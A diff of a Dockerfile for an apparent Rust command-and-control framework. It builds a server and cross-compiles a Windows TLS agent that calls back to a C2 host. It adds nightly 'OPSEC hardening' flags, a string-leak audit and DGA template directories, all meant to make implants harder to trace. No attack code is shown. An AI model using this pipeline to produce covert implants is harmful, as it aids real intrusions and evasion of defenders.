@@ -1,142 +1,91 @@
-# Dockerfile
-#
-# Single-stage build so cargo + rustup stay in the final image.
-# The builder binary spawns `cargo build` at runtime to compile agents,
-# which requires the Rust toolchain and source tree to be present.
-#
-# Image size: ~3-4 GB. This is expected for a C2 server that needs to
-# cross-compile agents for multiple platforms.
+# ── Stage 1: Build server, builder, and Linux client ─────────────────────────
+# NIGHTLY IS MANDATORY: agent OPSEC hardening (-Zlocation-detail=none,
+# -Ztrim-paths, -Zbuild-std + panic_immediate_abort) only exists on nightly,
+# and the builder REFUSES to produce agents on stable (see src/bin/builder.rs,
+# --allow-stable-leak). rust-src is required for the std rebuild.
+FROM rustlang/rust:nightly-bookworm AS build
 
-FROM rust:latest
-
-# ── System dependencies ────────────────────────────────────────────────
-# - mingw-w64:       Windows cross-compilation (x86_64-pc-windows-gnu)
-# - libssl-dev:      OpenSSL headers for the server binary
-# - pkg-config:      Helps cargo find system libraries
-# - cmake, clang:    Some crate build scripts need these
-# - musl-tools:      Optional: musl libc for fully static Linux binaries
-RUN apt-get update && apt-get install -y --no-install-recommends --fix-missing \
-        gcc-mingw-w64-x86-64 \
-        g++-mingw-w64-x86-64 \
-        mingw-w64 \
-        libssl-dev \
-        pkg-config \
-        cmake \
-        clang \
-        musl-tools \
-        ca-certificates \
-        curl \
+RUN rustup component add rust-src --toolchain nightly \
+ && rustup target add x86_64-pc-windows-gnu --toolchain nightly \
+ && rustup target add x86_64-unknown-linux-musl --toolchain nightly \
+ && apt-get update && apt-get install -y --no-install-recommends \
+        mingw-w64 gcc-mingw-w64-x86-64 musl-tools \
     && rm -rf /var/lib/apt/lists/*
 
-# ── Environment — set BEFORE rustup so build-time and runtime use the same paths
-# These must come before any `rustup` or `cargo` RUN steps so that the toolchain
-# is installed into /usr/local/cargo and /usr/local/rustup, which is the same
-# location the container will look for them at runtime.
-ENV PATH="/usr/local/cargo/bin:${PATH}"
-ENV CARGO_HOME="/usr/local/cargo"
-ENV RUSTUP_HOME="/usr/local/rustup"
+# IMPORTANT: do NOT set RUSTUP_TOOLCHAIN anywhere - it overrides
+# rust-toolchain.toml and silently downgrades the build to stable.
 
-# ── Rust cross-compilation targets ────────────────────────────────────
-# x86_64-unknown-linux-gnu  — native Linux (always available, explicit for clarity)
-# x86_64-pc-windows-gnu     — Windows via mingw-w64
-# macOS (x86_64-apple-darwin) requires osxcross and is not included here;
-# attempting a macOS build from the UI will fail with a clear error message.
-RUN rustup target add \
-        x86_64-unknown-linux-gnu \
-        x86_64-pc-windows-gnu
+WORKDIR /build
+COPY . .
 
-# Tell cargo to use the mingw linker for Windows targets, and remap
-# build-time paths so the compiled binaries don't leak host directory
-# structure in debug info or panic messages.
-#
-# These flags are written into the global Cargo config (not .cargo/config.toml
-# in the repo) so they apply both to the server build below AND to every
-# agent build the builder binary spawns at runtime — a RUSTFLAGS env var
-# set during `docker build` would not carry over to those runtime builds.
-#
-# /usr/local/cargo is the CARGO_HOME set above; this is always the correct
-# path inside the container regardless of who built the image.
-RUN mkdir -p "${CARGO_HOME}" && cat >> "${CARGO_HOME}/config.toml" << 'CARGOCONF'
-[target.x86_64-pc-windows-gnu]
-linker = "x86_64-w64-mingw32-gcc"
-ar = "x86_64-w64-mingw32-ar"
+# cargo config no longer injects rustflags; the builder sets them per-invocation.
+RUN cargo +nightly build --release --bin server --bin builder --bin client 2>&1
 
-[build]
-rustflags = [
-    "--remap-path-prefix", "/usr/local/cargo/registry=/cargo",
-    "--remap-path-prefix", "/app=/src",
-]
-CARGOCONF
+# ── Stage 2: Unit test gate ──────────────────────────────────────────────────
+FROM build AS test
+RUN cargo +nightly test --release --lib 2>&1
 
-# ── Working directory ─────────────────────────────────────────────────
-WORKDIR /app
+# ── Stage 3: Cross-compile Windows agents via the builder ───────────────────
+# The builder detects nightly, injects -Zlocation-detail=none -Ztrim-paths
+# -Zbuild-std=std,panic_abort -Zbuild-std-features=panic_immediate_abort and
+# --cfg agent_build, and packs the config as a binary blob.
+FROM build AS agents
+RUN rm -f dist/exe_windows_* && \
+    ./target/release/builder --host c2-server --port 4443 --transport tls \
+        --platform windows --sleep 2 --jitter-min 0 --jitter-max 0 && \
+    cp dist/exe_windows_*.exe /build/agent-tls.exe && \
+    rm -f dist/exe_windows_* && \
+    echo "[+] Windows TLS agent built"
 
-# ── Dependency pre-caching ────────────────────────────────────────────
-# Copy only the manifest files first. Docker caches this layer separately
-# from the source code, so dependency downloads only re-run when
-# Cargo.toml / Cargo.lock change, not on every source edit.
-COPY Cargo.toml Cargo.lock ./
-COPY build.rs ./
-COPY strcrypt/Cargo.toml ./strcrypt/Cargo.toml
+# ── Stage 4: String-audit gate (fail the image if anything leaked) ───────────
+FROM agents AS audit
+RUN chmod +x tools/string_audit.sh && \
+    ./tools/string_audit.sh /build/agent-tls.exe && \
+    echo "[+] String audit passed"
 
-# Create empty stub files for all [[bin]] targets so `cargo fetch`
-# and the dependency build succeed without the real source.
-RUN mkdir -p src/bin src/api/routes src/server src/agent/handlers \
-             src/agent/injection/windows src/agent/injection \
-             src/api \
-    && echo 'fn main() {}' > src/main.rs \
-    && for bin in server client builder client_dll client_service stager; do \
-           echo 'fn main() {}' > src/bin/${bin}.rs; \
-       done \
-    && echo 'pub fn placeholder() {}' > src/lib.rs \
-    && mkdir -p strcrypt/src \
-    && echo 'pub fn placeholder() {}' > strcrypt/src/lib.rs
+# ── Stage 5: Runtime ─────────────────────────────────────────────────────────
+FROM debian:bookworm-slim AS runtime
+# Runtime deps + everything needed to compile agents AT RUNTIME via the
+# builder API (openssl-sys/ring need cc+headers; mingw for Windows agents).
+RUN apt-get update && apt-get install -y --no-install-recommends \
+        ca-certificates sqlite3 curl \
+        build-essential pkg-config libssl-dev cmake \
+        gcc-mingw-w64-x86-64 musl-tools \
+        libxcb1-dev libxcb-shm0-dev libxcb-randr0-dev \
+        libxcb-shape0-dev libxcb-xfixes0-dev libx11-dev libxrandr-dev \
+    && rm -rf /var/lib/apt/lists/*
 
-# Fetch all dependencies (downloads crates, no compilation yet)
-RUN cargo fetch
+# Full Rust toolchain in the final image. Without it, the builder API fails
+# with "Cannot execute cargo binary". The toolchain dir carries nightly +
+# rust-src from the build stage; the builder pins RUSTUP_TOOLCHAIN=nightly on
+# spawned builds itself, so no env override is needed here.
+COPY --from=build /usr/local/cargo /usr/local/cargo
+COPY --from=build /usr/local/rustup /usr/local/rustup
+ENV PATH="/usr/local/cargo/bin:${PATH}" \
+    CARGO_HOME=/usr/local/cargo \
+    RUSTUP_HOME=/usr/local/rustup
 
-# ── Copy full source tree ─────────────────────────────────────────────
-# Now copy the real source. The dependency layer above is already cached.
-COPY src/ ./src/
-COPY strcrypt/ ./strcrypt/
-COPY certs/ ./certs/
-COPY panel/ ./panel/
-COPY modules/ ./modules/
-COPY extensions/ ./extensions/
-COPY traffic_profiles/ ./traffic_profiles/
-COPY fallback_profiles/ ./fallback_profiles/
+WORKDIR /opt/rcm
+COPY --from=audit /build/target/release/server  /opt/rcm/server
+COPY --from=audit /build/target/release/builder /opt/rcm/builder
+COPY --from=audit /build/target/release/client  /opt/rcm/client_linux
+COPY --from=audit /build/agent-tls.exe          /opt/rcm/agent-tls.exe
+COPY panel/ /opt/rcm/panel/
+COPY extensions/ /opt/rcm/extensions/
+COPY modules/ /opt/rcm/modules/
+COPY traffic_profiles/ /opt/rcm/traffic_profiles/
+COPY fallback_profiles/ /opt/rcm/fallback_profiles/
+COPY config.example.toml /opt/rcm/config.example.toml
 
-# ── Build server binaries ─────────────────────────────────────────────
-# Build the server and builder binaries for the native (Linux) target.
-# The agent client binaries (client, client_dll, etc.) are NOT built here —
-# they are compiled at runtime by the builder binary when an operator
-# requests a new agent from the web UI.
-RUN cargo build --release \
-        --bin server \
-        --bin builder \
-        --target x86_64-unknown-linux-gnu \
-    && cp target/x86_64-unknown-linux-gnu/release/server . \
-    && cp target/x86_64-unknown-linux-gnu/release/builder .
-
-# ── Runtime directories ───────────────────────────────────────────────
-RUN mkdir -p logs downloads data dist
-
-# ── Run as non-root ───────────────────────────────────────────────────
-# uid 1000 matches what start_docker.sh chowns the mounted directories to.
-RUN useradd -u 1000 -m -s /bin/bash rcm \
-    && chown -R rcm:rcm /app \
-    && chown -R rcm:rcm "${CARGO_HOME}" \
-    && chown -R rcm:rcm "${RUSTUP_HOME}"
-
-USER rcm
-
-# ── Healthcheck ───────────────────────────────────────────────────────
-HEALTHCHECK --interval=10s --timeout=5s --start-period=15s --retries=3 \
-    CMD curl -sf http://localhost:8080/api/auth/me || exit 1
-
-# ── Expose ports ──────────────────────────────────────────────────────
-# 8080 — API + web panel
-# 4443 — default TLS C2 listener
-EXPOSE 8080 4443
-
-CMD ["./server"]
+# Source tree for runtime agent builds (project root = /app, the compose
+# working_dir). Kept minimal: no target/, no dist/, no logs/.
+COPY Cargo.toml Cargo.lock* build.rs rust-toolchain.toml /app/
+COPY src/ /app/src/
+COPY strcrypt/ /app/strcrypt/
+COPY embedded/ /app/embedded/
+COPY dga_templates/ /app/dga_templates/
+COPY .cargo/ /app/.cargo/
+COPY gen_certs.sh /opt/rcm/gen_certs.sh
+RUN chmod +x /opt/rcm/server /opt/rcm/builder /opt/rcm/gen_certs.sh
+EXPOSE 4443 8080
+ENTRYPOINT ["/opt/rcm/server"]
